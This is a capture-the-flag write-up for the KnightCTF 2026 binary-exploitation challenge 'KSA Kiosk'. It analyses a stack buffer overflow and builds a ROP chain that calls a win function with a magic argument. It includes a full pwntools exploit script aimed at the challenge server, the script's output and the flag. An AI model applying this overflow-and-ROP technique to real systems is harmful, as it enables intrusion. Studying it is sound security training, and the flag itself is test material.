# KSA Kiosk - KnightCTF 2026 Writeup

**Category:** Pwn (Binary Exploitation)  
**Challenge:** KSA Kiosk  
**Flag:** `KCTF{_We3Lc0ME_TO_Knight_Squad_Academy_}`

---

## Challenge Overview

We are given a binary `ksa_kiosk` and a remote server to connect to:

```
nc 66.228.49.41 5000
```

Running the binary shows a kiosk menu for "Knight Squad Academy":

```
====================================================
             Knight Squad Academy
           Enrollment Kiosk  (v2.1)
====================================================
Authorized personnel only. All actions are audited.

1) Register cadet
2) Enrollment status
3) Exit
> 
```

---

## Initial Analysis

### Binary Properties

```bash
$ file ksa_kiosk
ksa_kiosk: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked

$ checksec --file=ksa_kiosk
RELRO           STACK CANARY      NX            PIE             
Full RELRO      No canary found   NX enabled    No PIE (0x400000)
```

**Key observations:**
- **64-bit ELF executable**
- **No Stack Canary** - Buffer overflows won't be detected
- **No PIE** - Fixed addresses, easy ROP gadget usage
- **NX enabled** - Can't execute shellcode on stack, need ROP
- **Full RELRO** - GOT is read-only, can't overwrite GOT entries

### Interesting Strings

```bash
$ strings ksa_kiosk | grep -E "flag|Success|badge|token"
./flag.txt
[Registry] Clearance badge issued:
badge
token
```

This suggests there's a function that reads and prints the flag file!

---

## Reverse Engineering

### Function Analysis

Using objdump/Ghidra, I identified the key functions:

#### Main Loop (`0x401687`)
- Displays menu and handles user input
- Option 1: Calls register cadet function (`0x401514`)
- Option 2: Calls enrollment status function (`0x401378`)
- Option 3: Exit

#### Register Cadet Function (`0x401514`)

```c
void register_cadet() {
    char notes_buffer[64];     // rbp-0x70
    char name_buffer[32];      // rbp-0x30
    ssize_t bytes_read;        // rbp-0x8
    
    puts("--- Cadet Registration ---");
    puts("Cadet name:");
    printf("> ");
    
    // Read name - custom readline, max 32 bytes
    readline(0, name_buffer, 0x20);
    
    puts("Enrollment notes:");
    printf("> ");
    
    // VULNERABILITY: read() allows 240 bytes into 64-byte buffer!
    bytes_read = read(0, notes_buffer, 0xf0);  // 0xf0 = 240 bytes
    
    // Check for keywords
    if (memmem(notes_buffer, bytes_read, "badge", 5) ||
        memmem(notes_buffer, bytes_read, "token", 5)) {
        puts("[Audit] Entry queued for manual review.");
    } else {
        puts("[Enrollment] Entry received.");
    }
    
    printf("Welcome, Cadet %s.\n", name_buffer);
    puts("Please wait for assignment.");
}
```

#### Win Function (`0x4013ac`)

```c
void read_flag(uint64_t magic) {
    char flag_buffer[128];
    
    // Security check - must pass magic value
    if (magic != 0x1337c0decafebeef) {
        puts("[SECURITY] Authorization failed.");
        puts("Session terminated.");
        exit(1);
    }
    
    // Read and print flag
    FILE *fp = fopen("./flag.txt", "r");
    if (!fp) {
        puts("Server error.");
        exit(1);
    }
    
    fgets(flag_buffer, 128, fp);
    fclose(fp);
    
    puts("[Registry] Clearance badge issued:");
    puts(flag_buffer);
}
```

---

## Vulnerability

### Stack Buffer Overflow

In the `register_cadet` function:
- `notes_buffer` is allocated at `rbp-0x70` (112 bytes from rbp)
- The buffer is only **64 bytes** (`0x70 - 0x30 = 0x40`)
- But `read()` allows reading **240 bytes** (`0xf0`)!

This allows overwriting:
1. The `name_buffer` (32 bytes)
2. Local variables
3. Saved RBP
4. **Return address**

### Stack Layout

```
+------------------+ <- rbp-0x70 (notes_buffer start)
|                  |
|   notes_buffer   |  64 bytes
|                  |
+------------------+ <- rbp-0x30 (name_buffer start)
|                  |
|   name_buffer    |  32 bytes
|                  |
+------------------+ <- rbp-0x10
|   local vars     |  16 bytes
+------------------+ <- rbp
|   saved RBP      |  8 bytes
+------------------+ <- rbp+0x08
|  return address  |  8 bytes  <- TARGET
+------------------+
```

**Offset to return address:** `0x70 + 0x08 = 120 bytes`

---

## Exploitation Strategy

### Goal
Call `read_flag(0x1337c0decafebeef)` to pass the security check and print the flag.

### ROP Chain

Since NX is enabled, we need Return-Oriented Programming (ROP):

1. **Find gadgets:**
```bash
$ ROPgadget --binary ksa_kiosk | grep "pop rdi"
0x000000000040150b : pop rdi ; ret
```

2. **Build ROP chain:**
   - `pop rdi; ret` - Load magic value into RDI (first argument)
   - Magic value: `0x1337c0decafebeef`
   - Return to `read_flag` at `0x4013ac`

3. **Stack alignment:**
   - x86_64 requires 16-byte stack alignment before `call`
   - Add extra `ret` gadget (`0x40150c`) for alignment

### Final Payload Structure

```
[    120 bytes padding    ]  <- Fill buffer to reach return address
[   0x40150c (ret)        ]  <- Stack alignment
[   0x40150b (pop rdi)    ]  <- ROP gadget
[ 0x1337c0decafebeef      ]  <- Magic value for RDI
[   0x4013ac (read_flag)  ]  <- Win function address
```

---

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

# Set up context
context.binary = elf = ELF('./ksa_kiosk')
context.log_level = 'info'

# Addresses
pop_rdi_ret = 0x40150b
ret_gadget = 0x40150c
win_function = 0x4013ac
magic_value = 0x1337c0decafebeef

# Connection
p = remote('66.228.49.41', 5000)

# Select option 1 (Register cadet)
p.recvuntil(b'> ')
p.sendline(b'1')

# Enter cadet name
p.recvuntil(b'> ')
p.sendline(b'hacker')

# Enter enrollment notes - overflow here!
p.recvuntil(b'> ')

# Build ROP chain
payload = b'A' * 120           # Padding to return address
payload += p64(ret_gadget)     # Stack alignment
payload += p64(pop_rdi_ret)    # pop rdi; ret
payload += p64(magic_value)    # 0x1337c0decafebeef
payload += p64(win_function)   # call read_flag

p.send(payload)

# Receive the flag
p.interactive()
```

---

## Execution

```bash
$ python3 solve.py
[+] Opening connection to 66.228.49.41 on port 5000: Done
[*] Switching to interactive mode
[Enrollment] Entry received.
Welcome, Cadet AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
Please wait for assignment.
[Registry] Clearance badge issued:
Your Flag : KCTF{_We3Lc0ME_TO_Knight_Squad_Academy_} ... Visit our website : knightsquad.academy
```

---

## Key Takeaways

1. **Buffer Overflow:** The `read()` call accepted 240 bytes into a 64-byte buffer
2. **No Stack Canary:** Made exploitation straightforward without needing a leak
3. **No PIE:** Fixed addresses allowed direct use of ROP gadgets
4. **ROP Chain:** Used `pop rdi; ret` gadget to control function argument
5. **Magic Value Check:** The win function required `RDI = 0x1337c0decafebeef`

---

## Files

- `ksa_kiosk` - Challenge binary
- `solve.py` - Exploit script

---

## Flag

```
KCTF{_We3Lc0ME_TO_Knight_Squad_Academy_}
```
